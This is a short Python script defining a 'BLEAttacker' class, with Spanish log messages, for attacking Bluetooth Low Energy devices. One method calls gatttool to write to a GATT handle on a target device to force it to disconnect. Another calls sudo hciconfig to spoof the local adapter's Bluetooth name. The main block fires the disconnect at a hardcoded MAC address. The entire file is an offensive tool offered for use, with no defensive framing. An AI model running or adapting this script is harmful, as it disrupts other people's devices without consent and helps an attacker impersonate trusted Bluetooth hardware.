import subprocess

class BLEAttacker:

    def disconnect_device(self, target_mac: str):
        print(f"[*] Intentando desconectar {target_mac}...")
        try:
            result = subprocess.run([
                'gatttool', '-b', target_mac, '--char-write-req',
                '--handle=0x0003', '--value=0000'
            ], capture_output=True, timeout=15)

            if result.returncode == 0:
                print(f"[+] Dispositivo {target_mac} desconectado")
                return True
            else:
                print(f"[-] No se pudo desconectar {target_mac}")
                return False

        except subprocess.TimeoutExpired:
            print(f"[-] Timeout: {target_mac} no respondio")
            return False

    def spoof_name(self, fake_name: str):
        print(f"[*] Cambiando nombre BT a: {fake_name}")
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'name', fake_name])
        print(f"[+] Nombre cambiado a {fake_name}")

if __name__ == "__main__":
    attacker = BLEAttacker()
    attacker.disconnect_device("7C:C9:5E:0E:61:D9")
